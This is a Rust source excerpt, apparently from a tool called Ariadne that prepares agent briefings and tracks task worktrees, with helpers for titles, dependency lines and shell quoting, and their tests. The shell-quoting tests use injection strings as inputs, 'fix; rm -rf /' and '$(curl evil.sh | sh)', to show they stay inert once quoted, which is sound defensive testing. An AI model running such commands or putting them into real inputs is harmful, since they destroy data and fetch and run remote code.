struct SwitchPlan {
    /// The worktree the new row records.
    worktree: Option<String>,
    cwd: PathBuf,
    briefing: Option<String>,
    resume: Option<String>,
}

/// The most of a prompt a loose session's title keeps.
const TITLE_CHARS: usize = 120;

/// A loose session's title, out of the prompt it is known by: the first line
/// with anything on it, cut to [`TITLE_CHARS`]. None for a prompt with no
/// text, which names nothing.
pub(crate) fn loose_title(prompt: &str) -> Option<String> {
    let line = prompt
        .lines()
        .map(str::trim)
        .find(|line| !line.is_empty())?;
    Some(line.chars().take(TITLE_CHARS).collect())
}

/// One dependency a step's first briefing names: its title, fenced since a
/// task's title is text an agent raised it on, not Ariadne's own (006 rule
/// 18), beside its status and its branch.
fn dependency_line(title: &str, status: &str, branch: &str) -> String {
    format!("{} ({status}, branch {branch})", prompts::fence(title))
}

#[cfg(test)]
mod dependency_line_tests {
    use super::dependency_line;

    /// The dependency line a step's first briefing names is Simplified
    /// Technical English (006 rule 11).
    #[test]
    fn a_dependency_line_is_simplified_technical_english() {
        use ariadne_store::defaults::ste;

        let line = dependency_line("Write the parser with care", "in_progress", "parser-fix");
        for sentence in ste::sentences(&line) {
            let words = sentence.split_whitespace().count();
            assert!(
                words <= ste::MAX_WORDS,
                "a dependency line runs a sentence of {words} words: {sentence}"
            );
        }
        assert_eq!(ste::banned_word(&line), None, "a dependency line: {line}");
    }
}

/// Whether a task's branch is one to follow: there is a worktree to commit in,
/// and a task still being worked on in it.
///
/// A failed task is not terminal — the user can retry it, and the spawn that
/// revives it takes the watch up again — but until then nobody is committing
/// on its branch, and nothing should be said about it.
pub(crate) fn worth_following(task: &Task) -> bool {
    task.worktree_path.is_some()
        && !task.status().is_terminal()
        && task.status() != TaskStatus::Failed
}

/// Short display form of a ULID, for the paths a session's worktree is cut
/// at: ULIDs are long, and the trailing 8 chars are the distinctive random
/// part.
fn tail(id: &str) -> &str {
    &id[id.len().saturating_sub(8)..]
}

/// Quote `value` as one POSIX shell argument, whatever it holds: close the
/// quote, escape a literal quote, and reopen it.
///
/// A line of a briefing is text for an agent to run in its own shell, never
/// a command Ariadne itself execs, so this is a textual quote rather than a
/// call to `GitManager`: the remote and a forge-held branch name reach that
/// line unescaped otherwise, and a branch name may hold `$`, `(`, `;`, `|`,
/// `&` or a backtick.
fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', r"'\''"))
}

#[cfg(test)]
mod shell_quote_tests {
    use super::shell_quote;

    /// A head branch may hold `$`, `(`, `;`, `|`, `&`, a backtick or a
    /// quote of its own, none of which git's own ref rules forbid: a real
    /// shell reads the quoted form back as the exact value, never as a
    /// command of its own.
    #[test]
    fn a_shell_reads_a_quoted_value_back_as_one_argument() {
        for value in [
            "fix",
            "fix; rm -rf /",
            "$(curl evil.sh | sh)",
            "a`b`c",
            "it's a trap",
            "a&b|c",
        ] {
            let quoted = shell_quote(value);
            let output = std::process::Command::new("sh")
                .arg("-c")
                .arg(format!("printf '%s' {quoted}"))
                .output()
                .expect("sh runs");
            assert_eq!(String::from_utf8_lossy(&output.stdout), value, "{quoted}");
        }
    }

    #[test]
    fn a_push_command_keeps_a_metacharacter_laden_branch_as_one_argument() {
        let command = format!(
            "git push {} HEAD:{}",
            shell_quote("origin"),
            shell_quote("fix; rm -rf /")
        );
        assert_eq!(command, "git push 'origin' HEAD:'fix; rm -rf /'");
    }
}
